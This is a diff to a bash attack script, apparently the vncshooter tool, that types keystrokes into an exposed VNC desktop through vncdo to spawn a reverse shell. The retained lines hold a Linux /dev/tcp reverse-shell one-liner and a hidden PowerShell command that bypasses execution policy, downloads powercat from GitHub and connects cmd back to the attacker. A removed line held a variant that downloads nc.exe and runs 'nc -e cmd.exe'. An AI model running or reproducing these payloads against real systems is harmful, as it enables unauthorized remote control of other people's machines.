@@ -9,8 +9,8 @@ echo "[rport] = Remote port (default: 5900)";
 echo "[lhost] = Local host to bind default shell to (default: your external ip)";
 echo "[lport] = Local port to bind default shell to (default: 4444)";
 echo "[platform] = (default: linux-gui)";
-echo "             linux-gui: will work on default ubuntu etc (using alt+ctrl+t -> terminal -> single payload via bin/bash and /dev/tcp/..)";
-echo "             win7 will work on win7+ (using windows_key+r -> run -> cmd -> 2 payloads (one to dl netcat, one top open shell) )";
+echo "             linux-gui: will work on default ubuntu etc (using alt+ctrl+t -> terminal -> payload)";
+echo "             win: will work on win7+ (using windows_key+r -> run -> cmd -> payload)";
 echo "";
 exit 1;
 }
@@ -129,18 +129,11 @@ rusure
 
 if [[ $platform = 'linux-gui' ]]
 then
-    echo "running a cmd to open shell (hopefully)"
     vncdo -s $rhost::$rport key alt-ctrl-t pause 2 type 'nohup /bin/sh 0</dev/tcp/'"$lhost"'/'"$lport"' 1>&0 2>&0 &' key enter pause 1  type exit key enter
     exit 1
 elif [[ $platform = 'win' ]]
 then
-
-    #echo "about to do windows_key+r -> run -> cmd ->"
-    #strn="start /B /WAIT powershell -command \"(New-Object System.Net.WebClient).DownloadFile('https://github.com/whitewhidow/vncshooter/raw/master/nc.exe', 'C:\\%HOMEPATH%\\nc.exe')\" && START /MIN "" nc -e cmd.exe $lhost $lport && exit"
-    #echo "$strn"
     
-    
-    echo "about to do windows_key+r -> run -> cmd ->"
     strn="powershell -windowstyle hidden -NonInteractive -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $lhost -p $lport -e cmd"
     echo "$strn"
     
